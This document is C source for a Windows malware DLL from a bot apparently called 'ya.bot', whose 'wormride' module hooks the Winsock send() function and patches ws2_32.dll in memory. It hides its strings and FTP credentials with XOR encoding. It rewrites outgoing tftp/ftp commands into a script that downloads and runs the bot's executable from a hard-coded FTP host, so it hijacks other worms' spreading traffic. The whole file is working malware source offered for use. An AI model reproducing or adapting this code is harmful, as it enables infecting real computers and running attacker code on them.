                                                                     
                                                                     
                                                                     
                                             
/*  ya.bot  */

#pragma optimize("gsy", on)
#pragma comment(linker, "/BASE:0x13570000") //0x13570000, 0x13140000, 0x19280000, 0x57800000 
#pragma comment(linker, "/ENTRY:DllMain")
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/IGNORE:4078")
#pragma comment(linker, "/MERGE:.rdata=.data") 
#pragma comment(linker, "/MERGE:.reloc=.data") 
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/RELEASE")
#pragma comment(linker, "/SECTION:.text, EWR")

#pragma comment(lib, "kernel32.lib") 
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "msvcrt.lib")
#pragma comment(lib, "ws2_32.lib")

#define _WIN32_WINNT 0x0400
#define  WIN32_LEAN_AND_MEAN
#define  WIN32_EXTRA_LEAN 
#include <windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

#include "xde.c"

char szReplace[512];

#define MAX_LINE				512


const int daemoncftpport = 21;
const int daemonftpport =
        2823;
        
// CONFIG
const int xorkey = 
        969;
char botfilename1[] = "\xC1\xDF\xC8\xD9\xDE\xCE\xDF\x83\xC8\xD5\xC8";
char daemonftpuser1[] = "\xFE\xC4\xE3\xC4\xFE\xF9\xE8\xFF";
char daemonftppass1[] = "\xCA\xC5\xC9\x9D\xC0\xC4\xC3\xCC\xD9\x9E\x00";
char daemoncftpuser1[] = "\xC0\xDD\xF2\x9B\x9C\x94\x95\x9F\x9C";
char daemoncftppass1[] = "\xCA\xC5\xC9\x9D\xC0\xC4\xC3\xCC\xD9\x9E";

char daemoncftphost[] = "ftp.my-place.us";
char decode_key[] = "wsrewnaf4yow3i75y45h6n84onfdvhja";
BOOL decode_comp = TRUE;
// CONFIG

const char *string_wormridekernel32 = //kernel32.dll
        "\xA2\xAC\xBB\xA7\xAC\xA5\xFA\xFB\xE7\xAD\xA5\xA5"; 
const char *string_wormridews232 = //ws2_32.dll
        "\xBE\xBA\xFB\x96\xFA\xFB\xE7\xAD\xA5\xA5";
const char *string_wormridegetprocaddress = //GetProcAddress
        "\x8E\xAC\xBD\x99\xBB\xA6\xAA\x88\xAD\xAD\xBB\xAC\xBA\xBA"; 
const char *string_wormridesend = //send
        "\xBA\xAC\xA7\xAD";
const char *string_wormridetftpexe = //tftp.exe -i
        "\xBD\xAF\xBD\xB9\xE7\xAC\xB1\xAC\xE9\xE4\xA0";
const char *string_wormrideftpexe = //ftp -n -s: 
        "\xAF\xBD\xB9\xE9\xE4\xA7\xE9\xE4\xBA\xF3";
const char *string_wormrideftpstring =
//echo open %s %i >> temp~987.dat&
//echo user %s %s >> temp~987.dat&
//echo get %s C:\%s >> temp~987.dat& 
//echo quit >> temp~987.dat&
//ftp -n -s:temp~987.dat&
//del /Q temp~987.dat&
//C:\%s%s
        "\xAC\xAA\xA1\xA6\xE9\xA6\xB9\xAC\xA7\xE9\xEC\xBA\xE9\xEC\xA0\xE9\xF7\xF7\xE9\xBD\xAC\xA4" 
        "\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\xAC\xAA\xA1\xA6\xE9\xBC\xBA\xAC\xBB\xE9\xEC\xBA"
        "\xE9\xEC\xBA\xE9\xF7\xF7\xE9\xBD\xAC\xA4\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\xAC\xAA" 
        "\xA1\xA6\xE9\xAE\xAC\xBD\xE9\xEC\xBA\xE9\x8A\xF3\x95\xEC\xBA\xE9\xF7\xF7\xE9\xBD\xAC\xA4"
        "\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\xAC\xAA\xA1\xA6\xE9\xB8\xBC\xA0\xBD\xE9\xF7\xF7" 
        "\xE9\xBD\xAC\xA4\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\xAF\xBD\xB9\xE9\xE4\xA7\xE9\xE4"
        "\xBA\xF3\xBD\xAC\xA4\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\xAD\xAC\xA5\xE9\xE6\x98\xE9" 
        "\xBD\xAC\xA4\xB9\xB7\xF0\xF1\xFE\xE7\xAD\xA8\xBD\xEF\x8A\xF3\x95\xEC\xBA\xEC\xBA";

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by akcom
//botbotbotbotbotbotbotbotbotbotbotbotbot 
char *Decode(char *s)
{
	unsigned int i, j;
	char *string;

	string = (char *) malloc (strlen(s)+1);

	strcpy(string, s);

	for (i = 0; i < strlen(string); i++)
	{
		for (j = 0; j < sizeof(decode_key); j++)
			string[i] ^= decode_key[j];

		if (decode_comp)
			string[i] = ~ string[i];
	}

	return string;
}
bool wormride_xdehook(LPVOID lpFunction, LPVOID lpDetour, FARPROC *pOldFunction)
{
    DWORD dwAddress, dwInstructionSize, dwOldFunctionSize = 0, dwOld;
    PBYTE byDetour, byFunction, byJump, byOldFunction, byPointer; 
    xde_instr xde;
    if ((!lpFunction) || (!lpDetour))
            return FALSE;
        byFunction = (PBYTE)lpFunction;
        byDetour = (PBYTE)lpDetour;
    if ((IsBadCodePtr((FARPROC)byFunction)) || (IsBadCodePtr((FARPROC)byDetour))) 
            return FALSE;
    if (byFunction[0] == 0xE9)
    {
            byJump = byFunction;
            dwAddress = *(PULONG)(byJump + 1);
            wormride_xdehook((PVOID)(dwAddress + (ULONG)byFunction + 5), lpDetour, pOldFunction); 
    }
        byPointer = byFunction;
    while (dwOldFunctionSize < 5)
    {
            dwInstructionSize = xde_disasm(byPointer, &xde);
        if (xde.flag & C_STOP)
                return FALSE; 
            dwOldFunctionSize += dwInstructionSize;
            byPointer += dwInstructionSize;
    }
        byOldFunction = (PBYTE)malloc(dwOldFunctionSize + 5);
        VirtualProtect(byOldFunction, dwOldFunctionSize + 5, PAGE_EXECUTE_READWRITE, &dwOld); 
        memcpy(byOldFunction, byFunction, dwOldFunctionSize);
        byPointer = byOldFunction + dwOldFunctionSize;
        *byPointer = 0xE9;
        *(PULONG)(byPointer + 1) = ((byFunction + dwOldFunctionSize) - 
                (byOldFunction + dwOldFunctionSize + 5));
        VirtualProtect(byOldFunction, dwOldFunctionSize + 5, dwOld | PAGE_EXECUTE, NULL);
        *(BYTE **)pOldFunction = byOldFunction;
        VirtualProtect(byFunction, dwOldFunctionSize + 5, PAGE_EXECUTE_READWRITE, &dwOld); 
        memset(byFunction, 0x90, dwOldFunctionSize);
        *byFunction = 0xE9;
        *(PULONG)(byFunction + 1) = ((byDetour) - (byFunction + 5));
        VirtualProtect(byFunction, dwOldFunctionSize, dwOld, NULL); 
        return TRUE;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by akcom
//botbotbotbotbotbotbotbotbotbotbotbotbot

void wormride_xdeunhook(LPVOID lpFunction, LPVOID lpOldFunction) 
{
    DWORD dwInstructionLength, dwOld, dwTotalLength = 0;
    PBYTE byFunction, byOldFunction, byPointer;
    xde_instr xde;
        byFunction = (PBYTE)lpFunction;
        byOldFunction = (PBYTE)lpOldFunction; 
        byPointer = byOldFunction;
    while (TRUE)
    {
            dwInstructionLength = xde_disasm(byPointer, &xde);
        if (xde.flag & C_STOP)
                break;
            dwTotalLength += dwInstructionLength; 
            byPointer += dwInstructionLength;
    }
        VirtualProtect(lpFunction, dwTotalLength, PAGE_EXECUTE_READWRITE, &dwOld);
        memcpy(lpFunction, lpOldFunction, dwTotalLength);
        VirtualProtect(lpFunction, dwTotalLength, dwOld, NULL); 
        free(lpOldFunction);
        return;
}

char *wormride_getip()
{
    char szHostName[128];
    hostent *he;
    sockaddr_in sin;
    static char s_szIP[16];
    WSADATA wsadata;
    if (WSAStartup(0x0202, &wsadata) != 0)
            return NULL;
    if (gethostname(szHostName, sizeof(szHostName) - 1) == SOCKET_ERROR)
            return NULL;
        he = gethostbyname(szHostName); 
    if (!he)
            return NULL;
        memcpy(&sin.sin_addr, he->h_addr_list[0], he->h_length);
        strncpy(s_szIP, inet_ntoa(sin.sin_addr), sizeof(s_szIP) - 1);
        WSACleanup(); 
        return s_szIP;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by neonew
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool wormride_patchwinsock()
{
    BYTE *byModule;
    DWORD dwAccess = PAGE_EXECUTE_READWRITE, dwOld = 0; 
        byModule = (BYTE *)LoadLibrary(string_wormridews232);
    if (!byModule)
            return FALSE;
    if (VirtualProtect(&byModule[0x66EF], 5, dwAccess, &dwOld))
    {
        if ((byModule[0x66EF + 0] == 0xE8) && 
                    (byModule[0x66EF + 1] == 0x60) &&
                    (byModule[0x66EF + 2] == 0x08) &&
                    (byModule[0x66EF + 3] == 0x00) &&
                    (byModule[0x66EF + 4] == 0x00)) 
        {
                byModule[0x66EF + 0] = 0x33;
                byModule[0x66EF + 1] = 0xC0;
                byModule[0x66EF + 2] = 0x90;
                byModule[0x66EF + 3] = 0x90;
                byModule[0x66EF + 4] = 0x90; 
        }
            VirtualProtect(&byModule[0x66EF], 5, dwOld, &dwAccess);
    }
        return TRUE;
}

void wormride_xor(char *pszBuffer, int nKey)
{
    int i;
    if (!pszBuffer) 
            return;
    for (i = 0; i < (int)strlen(pszBuffer); i++)
            pszBuffer[i] ^= nKey;
        return;
}

typedef int (WINAPI *psend)(SOCKET s, const char *buf, int len, int flags); 
psend sendNextHook;
int WINAPI wormride_detoursend(SOCKET s, const char *buf, int len, int flags)
{
    char *p[2];
        p[0] = strstr(buf, string_wormridetftpexe);
        p[1] = strstr(buf, string_wormrideftpexe); 
    if ((p[0]) || (p[1]))
    {
            buf = szReplace;
//strcat(buf,szReplace);
            len = strlen(szReplace);
    }
        return sendNextHook(s, buf, len, flags);
}

bool WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved) 
{
    switch(dwReason)
    {
        case DLL_PROCESS_ATTACH:
			char botfilename[MAX_LINE]; //= "";
char daemonftpuser[MAX_LINE]; //= ""; 
char daemonftppass[MAX_LINE]; //= "";
char daemoncftpuser[MAX_LINE]; //= ""; 
char daemoncftppass[MAX_LINE]; //= "";
               // strcat(botfilename, Decode(botfilename1));
               // strcat(daemonftpuser, Decode(daemonftpuser1));
              //  strcat(daemonftppass, Decode(daemonftppass1));
             _snprintf(botfilename, sizeof(botfilename),"%s", Decode(botfilename1));
_snprintf(daemonftpuser, sizeof(daemonftpuser),"%s", Decode(daemonftpuser1));
_snprintf(daemonftppass, sizeof(daemonftppass),"%s", Decode(daemonftppass1));  
_snprintf(daemoncftpuser, sizeof(daemoncftpuser),"%s", Decode(daemoncftpuser1));
_snprintf(daemoncftppass, sizeof(daemoncftppass),"%s", Decode(daemoncftppass1));  
/* wormride_xor((char *)botfilename, xorkey);
                wormride_xor((char *)daemonftppass, xorkey);
                wormride_xor((char *)daemonftpuser, xorkey); */
                wormride_xor((char *)string_wormridekernel32, xorkey);
                wormride_xor((char *)string_wormridews232, xorkey);
                wormride_xor((char *)string_wormridegetprocaddress, xorkey); 
                wormride_xor((char *)string_wormridesend, xorkey);
                wormride_xor((char *)string_wormridetftpexe, xorkey);
                wormride_xor((char *)string_wormrideftpexe, xorkey);
                wormride_xor((char *)string_wormrideftpstring, xorkey); 
                memset(szReplace, 0, sizeof(szReplace));
                _snprintf(szReplace, sizeof(szReplace) - 1,
                        string_wormrideftpstring,
                        daemoncftphost,
                        daemoncftpport, daemoncftpuser, daemoncftppass,
                        botfilename, botfilename, botfilename,
                        "\r\n");
                wormride_patchwinsock(); 
                wormride_xdehook((FARPROC)send, &wormride_detoursend, (FARPROC *)&sendNextHook);
                break;
        case DLL_PROCESS_DETACH:
                wormride_xdeunhook((FARPROC)send, sendNextHook); 
                FreeLibrary(hModule);
                break;
    }
        return TRUE;
} 